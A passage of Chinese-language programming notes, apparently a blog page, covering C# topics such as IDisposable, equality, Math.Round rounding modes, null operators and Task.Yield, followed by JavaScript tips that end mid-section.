<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ViewModel</span> : <span class="title">INotifyPropertyChanged</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">event</span> PropertyChangedEventHandler PropertyChanged;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [CallerMemberName] 特性要求 propertyName 具有默认值</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnPropertyChanged</span>(<span class="params">[CallerMemberName] <span class="keyword">string</span> propertyName = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        PropertyChanged?.Invoke(<span class="keyword">this</span>, <span class="keyword">new</span> PropertyChangedEventArgs(propertyName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> property;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Property</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> property; &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">value</span> != property)</span><br><span class="line">            &#123;</span><br><span class="line">                property = <span class="keyword">value</span>;</span><br><span class="line">                OnPropertyChanged();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Xamarin"><a href="#Xamarin" class="headerlink" title="Xamarin"></a>Xamarin</h2><hr>
<h2 id="UnitTest"><a href="#UnitTest" class="headerlink" title="UnitTest"></a>UnitTest</h2><h3 id="框架对比"><a href="#框架对比" class="headerlink" title="框架对比"></a>框架对比</h3><figure class="image-box">
                <img src="ComparingUnitTestFrameworks.png" alt title class>
                <p></p>
            </figure>

<h1 id="C-35"><a href="#C-35" class="headerlink" title="C&#35;"></a>C&#35;</h1><h2 id="变量的命名"><a href="#变量的命名" class="headerlink" title="变量的命名"></a>变量的命名</h2><p>基本的变量命名规则如下：</p>
<ul>
<li>变量名的第一个字符必须是字母、下划线 ( _ ) 或 @。</li>
<li>其后的字符可以是字母、下划线或数字。</li>
</ul>
<hr>
<h2 id="构建某个类型的某个实例时系统所执行的操作"><a href="#构建某个类型的某个实例时系统所执行的操作" class="headerlink" title="构建某个类型的某个实例时系统所执行的操作"></a>构建某个类型的某个实例时系统所执行的操作</h2><p>构建某个类型的某个实例时系统所执行的操作：</p>
<ol>
<li>把存放静态变量的空间清零。</li>
<li>执行静态变量的初始化语句。</li>
<li>执行基类的静态构造函数。</li>
<li>执行（本类的）静态构造函数。</li>
<li>把存放实例变量的空间清零。</li>
<li>执行实例变量的初始化语句。</li>
<li>适当地执行基类的实例构造函数。</li>
<li>执行（本类的）实例构造函数。</li>
</ol>
<p>&emsp;&emsp;以后如果还要构造该类型的实例，那么会直接从第5步开始执行，因为类级别的初始化工作只执行一次就够了。此外，可以通过链式调用构造函数的办法来优化第6、7两步，使得编译器在制作程序码时不再生成重复的指令。</p>
<hr>
<h2 id="类继承时基类与子类应该做到的几点"><a href="#类继承时基类与子类应该做到的几点" class="headerlink" title="类继承时基类与子类应该做到的几点"></a>类继承时基类与子类应该做到的几点</h2><p>在类的继承体系中，位于根部的那个基类应该做到以下几点：</p>
<ul>
<li>实现 IDisposable 接口，以便释放资源。</li>
<li>如果本身含有非托管资源，那就添加 finalizer，以防客户端忘记调用 Dispose() 方法。若是没有非托管资源，则不用添加 finalizer。</li>
<li>Dispose 方法与 finalizer（如果有的话）都把释放资源的工作委派给虚方法，使得子类能够重写该方法，以释放它们自己的资源。</li>
</ul>
<p>继承体系中的子类应该做到以下几点：</p>
<ul>
<li>如果子类中有自己的资源需要释放，那就重写由基类所定义的那个虚方法，若是没有，则不用重写该方法。</li>
<li>如果子类自身的某个成员字段表示的是非托管资源，那么就实现 finalizer，若没有这样的字段，则不用实现 finalizer。</li>
<li>记得调用基类的同名函数。</li>
</ul>
<hr>
<h2 id="实现-IDisposable-Dispose-方法时的注意点"><a href="#实现-IDisposable-Dispose-方法时的注意点" class="headerlink" title="实现 IDisposable.Dispose() 方法时的注意点"></a>实现 IDisposable.Dispose() 方法时的注意点</h2><p>实现 IDisposable.Dispose() 方法时，要注意以下四点：</p>
<ol>
<li>把非托管资源全都释放掉。</li>
<li>把托管资源全都释放掉（这也包括不再订阅早前关注的那些事件）。</li>
<li>设定相关的状态标志，用以表示该对象已经清理过了。如果对象已经清理过了之后还有人要访问其中的公有成员，那么你可以通过此标志得知这一状况，从而令这些操作抛出 ObjectDisposedException。</li>
<li>阻止垃圾回收器重复清理该对象。这可以通过 GC.SuppressFinalize(this) 来完成。</li>
</ol>
<hr>
<h2 id="死锁的发生必须满足的条件"><a href="#死锁的发生必须满足的条件" class="headerlink" title="死锁的发生必须满足的条件"></a>死锁的发生必须满足的条件</h2><p>死锁的发生必须满足以下 4 个基本条件：<br>（1）排他或互斥（Mutual Exclusion）：一个线程（ThreadA）独占一个资源，没有其他线程（ThreadB）能获取相同的资源。<br>（2）占有并等待（Hold and wait）：一个排他的线程（ThreadA）请求获取另一个线程（ThreadB）占有的资源。<br>（3）不可抢先（No preemption）：一个线程（ThreadA）占有的资源不能被强制拿走（只能等待 ThreadA 主动释放它锁定的资源）。<br>（4）循环等待条件（Circular wait condition）：两个或多个线程构成一个循环等待链，它们锁定两个或多个相同的资源，每个线程都在等待链中下一个线程占有的资源。<br>移除其中任何一个条件，都能阻止死锁的发生。</p>
<hr>
<h2 id="C-35-决定两个对象是否“相等”的-4-个函数"><a href="#C-35-决定两个对象是否“相等”的-4-个函数" class="headerlink" title="C&#35; 决定两个对象是否“相等”的 4 个函数"></a>C&#35; 决定两个对象是否“相等”的 4 个函数</h2><p>C# 提供了 4 种不同的函数，用来决定两个对象是否“相等”：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">ReferenceEquals</span>(<span class="params"><span class="keyword">object</span> left, <span class="keyword">object</span> right</span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Equals</span>(<span class="params"><span class="keyword">object</span> left, <span class="keyword">object</span> right</span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">Equals</span>(<span class="params"><span class="keyword">object</span> right</span>)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="keyword">operator</span> ==(MyClass left, MyClass right);</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="重写-System-Object-GetHashCode-方法必须遵守的-3-条规则"><a href="#重写-System-Object-GetHashCode-方法必须遵守的-3-条规则" class="headerlink" title="重写 System.Object.GetHashCode() 方法必须遵守的 3 条规则"></a>重写 System.Object.GetHashCode() 方法必须遵守的 3 条规则</h2><p>&emsp;&emsp;.NET 中的每个对象都有哈希码，其哈希码由 System.Object.GetHashCode() 决定。如果要重写该方法，那么必须遵守下面 3 条规则：</p>
<ol>
<li>如果（实例版本的 Equals() 方法认定的）两个对象相等，那么这两个对象的哈希码也必须相同，否则，容器无法通过正确的哈希码来寻找相应的元素。</li>
<li>对于任何一个对象 A 来说，GetHashCode() 必须在实例层面上满足这样一种不变条件（或者说，在实例层面上具备这样一种固定的性质）—— 在 A 的生命期内，无论实例 A 在执行完 GetHashCode() 方法之后还执行过其他哪些方法，当它再度执行 GetHashCode() 时，必定返回与当初相同的值。这条性质用来确保容器总是能把 A 放在正确的桶中。</li>
<li>对于常见的输入值来说，哈希函数应该把这些值均匀地映射到各个整数上，而不应该使自己所输出的哈希码仅仅集中在几个整数上。如果每一个整数都能有相似的概率来充当对象的哈希码，那么基于哈希的容器就能够较为高效地运作。简单来说，就是要保证自己所实现的 GetHashCode() 能够让元素均匀地保存在容器的每一个桶中。此外，每个桶的元素个数也不宜太多。</li>
</ol>
<hr>
<h2 id="重写-object-Equals-的步骤"><a href="#重写-object-Equals-的步骤" class="headerlink" title="重写 object.Equals() 的步骤"></a>重写 object.Equals() 的步骤</h2><p>（1）检查是否为 null。<br>（2）如果是引用类型，就检查引用是否相等。<br>（3）检查数据类型是否相同。<br>（4）调用一个指定了具体类型的辅助方法，它的操作数是具体要比较的类型而不是 object。<br>（5）可能要检查哈希码是否相等来短路一次全面的、逐字段的比较。（相等的两个对象不可能哈希码不同。）<br>（6）如基类重写了 Equals()，就检查 base.Equals()。<br>（7）比较每一个标识字段（关键字段），判断是否相等。<br>（8）重写 GetHashCode()。<br>（9）重写 == 和 != 操作符。</p>
<hr>
<h2 id="Math-Round-默认四舍六入五成双"><a href="#Math-Round-默认四舍六入五成双" class="headerlink" title="Math.Round 默认四舍六入五成双"></a>Math.Round 默认四舍六入五成双</h2><blockquote>
<p><a href="https://www.cnblogs.com/lwqlun/p/12070839.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwqlun/p/12070839.html</a></p>
</blockquote>
<p><code>Math.Round</code> 默认使用的并非是四舍五入的原则，而是<strong>四舍六入五成双</strong>的原则。<br>所谓的四舍六入五成双，就是说当确定有效位数之后，<strong>有效位数的下一位</strong>如果<strong>小于等于 4 就舍去</strong>，如果<strong>大于等于 6 就进一</strong>，当有效位数的下一位是 5 的时候</p>
<ul>
<li>如果 <strong>5 前为奇数，就舍五进一</strong></li>
<li>如果 <strong>5 前为偶数，就舍五不进</strong>（0是偶数）</li>
</ul>
<p>C# 中的 <code>Math.Round</code> 提供了非常多的重载方法，其中有两个重载方法是：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">Round</span> (<span class="params"><span class="keyword">double</span> <span class="keyword">value</span>, <span class="keyword">int</span> digits, MidpointRounding mode</span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">decimal</span> <span class="title">Round</span> (<span class="params"><span class="keyword">decimal</span> d, <span class="keyword">int</span> decimals, MidpointRounding mode</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这两个方法都提供了第三个参数 mode，mode 是一个 <code>MidpointRounding</code> 的枚举变量，它有 2 个可选值</p>
<ul>
<li><code>AwayFromZero</code> - 四舍五入</li>
<li><code>ToEven</code> - 四舍六入五成双</li>
</ul>
<p>所以如果我们希望的到一个理想中四舍五入的结果，我们可以改用如下代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = Math.Round(<span class="number">12.125</span>, <span class="number">2</span>, MidpointRounding.AwayFromZero);</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="关于-null-的几个运算符"><a href="#关于-null-的几个运算符" class="headerlink" title="关于 null 的几个运算符"></a>关于 null 的几个运算符</h2><blockquote>
<p><a href="https://mp.weixin.qq.com/s/A5xgijT0vhOvj-wCHeeuBA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/A5xgijT0vhOvj-wCHeeuBA</a></p>
</blockquote>
<h3 id="和"><a href="#和" class="headerlink" title="?. 和 ?[]"></a>?. 和 ?[]</h3><p>Null 条件运算符在 C# 6 以后可用，仅当操作数为非 null 时才会访问成员或者访问元素。<code>?.</code>和<code>?[]</code>很好区分；我们知道<code>.</code>是访问成员或者命空间啥的，<code>[]</code>索引器访问，以下演示运算符的用法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">double</span>? SumNumbers(List&lt;<span class="keyword">double</span>[]&gt; setsOfNumbers, <span class="keyword">int</span> indexOfSetToSum)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//如果 setsOfNumbers 非空，访问指定的索引；如果对应元素的索引不为空，求和</span></span><br><span class="line">    <span class="keyword">return</span> setsOfNumbers?[indexOfSetToSum]?.Sum() ;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">var</span> sum1 = SumNumbers(<span class="literal">null</span>, <span class="number">0</span>);</span><br><span class="line">Console.WriteLine(sum1??Double.NaN);  <span class="comment">// 输出: NaN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> numberSets = <span class="keyword">new</span> List&lt;<span class="keyword">double</span>[]&gt; &#123; <span class="keyword">new</span>[] &#123; <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span> &#125;, <span class="literal">null</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum2 = SumNumbers(numberSets, <span class="number">0</span>);</span><br><span class="line">Console.WriteLine(sum2 ?? Double.NaN);  <span class="comment">// 输出: 6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum3 = SumNumbers(numberSets, <span class="number">1</span>);</span><br><span class="line">Console.WriteLine(sum3 ?? Double.NaN);  <span class="comment">// 输出: NaN</span></span><br></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title="??"></a>??</h3><p>Null 合并运算符，什么意思？就是如果这个值为空，就使用另外一个值，<code>a ?? b</code>,如果 a 为非 null，则结果为 a；否则结果为 b。仅当 a 为 null 时，操作才计算 b。常用场景比如：使用 <code>throw</code> 表达式作为<code>??</code>运算符的右操作数，检测数据、当获取为空时赋值默认值等等。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> comment = _blogService.GetBlogCommentById(id)</span><br><span class="line">                ?? <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">"指定的id为查到对应数据！"</span>, <span class="keyword">nameof</span>(id));</span><br></pre></td></tr></table></figure>

<h3 id="-1"><a href="#-1" class="headerlink" title="??="></a>??=</h3><p>运算符<code>??=</code>是在 C# 8.0 引入的 Null 合并赋值运算符。什么意思？就是当左操作数计算为 null 时，才能使用运算符<code>??=</code>将其有操作符的值 赋值给左操作数。实例代码如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">List&lt;<span class="keyword">int</span>&gt; numbers = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">int</span>? i = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">numbers ??= <span class="keyword">new</span> List&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line">numbers.Add(i ??= <span class="number">66</span>);</span><br><span class="line">numbers.Add(i ??= <span class="number">99</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价于一下代码</span></span><br><span class="line"><span class="comment">//if (i==null)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    i = 66;</span></span><br><span class="line"><span class="comment">//    numbers.Add(i.Value);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//if (i == null)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    i = 99;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//numbers.Add(i.Value);</span></span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="keyword">string</span>.Join(<span class="string">" "</span>, numbers));  <span class="comment">// 输出: 66 66</span></span><br><span class="line">Console.WriteLine(i);  <span class="comment">// output: 66</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="运算符提升（Operator-Lifting）"><a href="#运算符提升（Operator-Lifting）" class="headerlink" title="运算符提升（Operator Lifting）"></a>运算符提升（Operator Lifting）</h2><blockquote>
<p><code>four</code>，<code>five</code>，<code>nullInt</code>的类型都是<code>Nullable&lt;int&gt;</code>。</p>
</blockquote>
<table>
<thead>
<tr>
<th>Expression</th>
<th>Lifted operator</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td>-nullInt</td>
<td>int? -(int? x)</td>
<td>null</td>
</tr>
<tr>
<td>-five</td>
<td>int? -(int? x)</td>
<td>-5</td>
</tr>
<tr>
<td>five + nullInt</td>
<td>int? +(int? x, int? y)</td>
<td>null</td>
</tr>
<tr>
<td>five + five</td>
<td>int? +(int? x, int? y)</td>
<td>10</td>
</tr>
<tr>
<td>four &amp; nullInt</td>
<td>int? &amp;(int? x, int? y)</td>
<td>null</td>
</tr>
<tr>
<td>four &amp; five</td>
<td>int? &amp;(int? x, int? y)</td>
<td>4</td>
</tr>
<tr>
<td>nullInt == nullInt</td>
<td>bool ==(int? x, int? y)</td>
<td>true</td>
</tr>
<tr>
<td>five == five</td>
<td>bool ==(int? x, int? y)</td>
<td>true</td>
</tr>
<tr>
<td>five == nullInt</td>
<td>bool ==(int? x, int? y)</td>
<td>false</td>
</tr>
<tr>
<td>five == four</td>
<td>bool ==(int? x, int? y)</td>
<td>false</td>
</tr>
<tr>
<td>four &lt; five</td>
<td>bool &lt;(int? x, int? y)</td>
<td>true</td>
</tr>
<tr>
<td>nullInt &lt; five</td>
<td>bool &lt;(int? x, int? y)</td>
<td>false</td>
</tr>
<tr>
<td>five &lt; nullInt</td>
<td>bool &lt;(int? x, int? y)</td>
<td>false</td>
</tr>
<tr>
<td>nullInt &lt; nullInt</td>
<td>bool &lt;(int? x, int? y)</td>
<td>false</td>
</tr>
<tr>
<td>nullInt &lt;= nullInt</td>
<td>bool &lt;=(int? x, int? y)</td>
<td>false</td>
</tr>
</tbody></table>
<h2 id="可空逻辑运算"><a href="#可空逻辑运算" class="headerlink" title="可空逻辑运算"></a>可空逻辑运算</h2><blockquote>
<p>针对<code>Nullable&lt;bool&gt;</code>，没有条件逻辑运算符。例如<code>&amp;&amp;</code>，<code>||</code>。</p>
</blockquote>
<table>
<thead>
<tr>
<th>x</th>
<th>y</th>
<th>x &amp; y</th>
<th>x | y</th>
<th>x ^ y</th>
<th>!x</th>
</tr>
</thead>
<tbody><tr>
<td>true</td>
<td>true</td>
<td>true</td>
<td>true</td>
<td>false</td>
<td>false</td>
</tr>
<tr>
<td>true</td>
<td>false</td>
<td>false</td>
<td>true</td>
<td>true</td>
<td>false</td>
</tr>
<tr>
<td>true</td>
<td>null</td>
<td>null</td>
<td><strong>true</strong></td>
<td>null</td>
<td>false</td>
</tr>
<tr>
<td>false</td>
<td>true</td>
<td>false</td>
<td>true</td>
<td>true</td>
<td>true</td>
</tr>
<tr>
<td>false</td>
<td>false</td>
<td>false</td>
<td>false</td>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>false</td>
<td>null</td>
<td><strong>false</strong></td>
<td>null</td>
<td>null</td>
<td>true</td>
</tr>
<tr>
<td>null</td>
<td>true</td>
<td>null</td>
<td><strong>true</strong></td>
<td>null</td>
<td>null</td>
</tr>
<tr>
<td>null</td>
<td>false</td>
<td><strong>false</strong></td>
<td>null</td>
<td>null</td>
<td>null</td>
</tr>
<tr>
<td>null</td>
<td>null</td>
<td>null</td>
<td>null</td>
<td>null</td>
<td>null</td>
</tr>
</tbody></table>
<hr>
<h2 id="await-Task-Yield-和-await-Task-CompletedTask-有什么不同"><a href="#await-Task-Yield-和-await-Task-CompletedTask-有什么不同" class="headerlink" title="await Task.Yield() 和 await Task.CompletedTask 有什么不同"></a>await Task.Yield() 和 await Task.CompletedTask 有什么不同</h2><blockquote>
<p><a href="https://www.cnblogs.com/OpenCoder/p/12201446.html" target="_blank" rel="noopener">https://www.cnblogs.com/OpenCoder/p/12201446.html</a></p>
</blockquote>
<ul>
<li><code>Task.CompletedTask</code>本质上来说是返回一个已经完成的 Task 对象，所以这时如果我们用<code>await</code>关键字去等待<code>Task.CompletedTask</code>，.NET Core 认为没有必要再去线程池启动一个新的线程来执行<code>await</code>关键字之后的代码，所以实际上<code>await Task.CompletedTask</code>之前和之后的代码是在同一个线程上同步执行的，通俗易懂的说就是单线程的。这也是为什么很多文章说，使用了 await async 关键字并不代表程序就变成异步多线程的了。</li>
<li>而<code>Task.Yield()</code>就不一样了，我们可以理解<code>Task.Yield()</code>是真正使用 Task 来启动了一个线程，只不过这个线程什么都没有干，相当于在使用<code>await Task.Yield()</code>的时候，确实是在用<code>await</code>等待一个还没有完成的<code>Task</code>对象，所以这时调用线程（主线程）就会立即返回去做其它事情了，当调用线程（主线程）返回后，<code>await</code>等待的<code>Task</code>对象就立即变为完成了，这时<code>await</code>关键字之后的代码由另外一个线程池线程来执行。</li>
</ul>
<hr>
<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="9-个小技巧"><a href="#9-个小技巧" class="headerlink" title="9 个小技巧"></a>9 个小技巧</h2><blockquote>
<p><a href="http://blog.yidengxuetang.com/post/201912/11/" target="_blank" rel="noopener">http://blog.yidengxuetang.com/post/201912/11/</a></p>
</blockquote>
<h3 id="全部替换"><a href="#全部替换" class="headerlink" title="全部替换"></a>全部替换</h3><p>我们知道 <code>string.replace()</code> 函数仅替换第一次出现的情况。<br>你可以通过在正则表达式的末尾添加 <code>/g</code> 来替换所有出现的内容。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> example = <span class="string">"potato potato"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(example.replace(<span class="regexp">/pot/</span>, <span class="string">"tom"</span>)); </span><br><span class="line"><span class="comment">// "tomato potato"</span></span><br><span class="line"><span class="built_in">console</span>.log(example.replace(<span class="regexp">/pot/g</span>, <span class="string">"tom"</span>)); </span><br><span class="line"><span class="comment">// "tomato tomato"</span></span><br></pre></td></tr></table></figure>

<h3 id="提取唯一值"><a href="#提取唯一值" class="headerlink" title="提取唯一值"></a>提取唯一值</h3><p>通过使用 Set 对象和展开运算符，我们可以创建一个具有唯一值的新数组。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">var</span> unique_entries = [...new <span class="built_in">Set</span>(entries)];</span><br><span class="line"><span class="built_in">console</span>.log(unique_entries);</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure>

<h3 id="将数字转换为字符串"><a href="#将数字转换为字符串" class="headerlink" title="将数字转换为字符串"></a>将数字转换为字符串</h3><p>我们只需要使用带空引号的串联运算符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> converted_number = <span class="number">5</span> + <span class="string">""</span>;</span><br><span class="line"><span class="built_in">console</span>.log(converted_number);</span><br><span class="line"><span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> converted_number); </span><br><span class="line"><span class="comment">// string</span></span><br></pre></td></tr></table></figure>

<h3 id="将字符串转换为数字"><a href="#将字符串转换为数字" class="headerlink" title="将字符串转换为数字"></a>将字符串转换为数字</h3><p>我们需要的只是 <code>+</code> 运算符。<br>请注意它仅适用于“字符串数字”。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">the_string = <span class="string">"123"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(+the_string);</span><br><span class="line"><span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line">the_string = <span class="string">"hello"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(+the_string);</span><br><span class="line"><span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>

<h3 id="随机排列数组中的元素"><a href="#随机排列数组中的元素" class="headerlink" title="随机排列数组中的元素"></a>随机排列数组中的元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"><span class="built_in">console</span>.log(my_list.sort(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span></span><br><span class="line">&#125;)); </span><br><span class="line"><span class="comment">// [4, 8, 2, 9, 1, 3, 6, 5, 7]</span></span><br></pre></td></tr></table></figure>

<h3 id="展平多维数组"><a href="#展平多维数组" class="headerlink" title="展平多维数组"></a>展平多维数组</h3><p>只需使用展开运算符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>], <span class="number">9</span>];</span><br><span class="line"><span class="keyword">var</span> flat_entries = [].concat(...entries); </span><br><span class="line"><span class="comment">// [1, 2, 5, 6, 7, 9]</span></span><br></pre></td></tr></table></figure>

<h3 id="缩短条件语句"><a href="#缩短条件语句" class="headerlink" title="缩短条件语句"></a>缩短条件语句</h3><p>让我们来看这个例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (available) &#123;</span><br><span class="line">    addToCart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过简单地使用变量和函数来缩短它：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">available &amp;&amp; addToCart()</span><br></pre></td></tr></table></figure>

<h3 id="动态属性名"><a href="#动态属性名" class="headerlink" title="动态属性名"></a>动态属性名</h3><p>我一直以为必须先声明一个对象，然后才能分配动态属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dynamic = <span class="string">'flavour'</span>;</span><br><span class="line"><span class="keyword">var</span> item = &#123;</span><br><span class="line">    name: <span class="string">'Coke'</span>,</span><br><span class="line">    [dynamic]: <span class="string">'Cherry'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(item); </span><br><span class="line"><span class="comment">// &#123; name: "Coke", flavour: "Cherry" &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-length-调整-清空数组"><a href="#使用-length-调整-清空数组" class="headerlink" title="使用 length 调整/清空数组"></a>使用 length 调整/清空数组</h3><p>我们基本上覆盖了数组的 length 。<br>如果我们要调整数组的大小：</p>
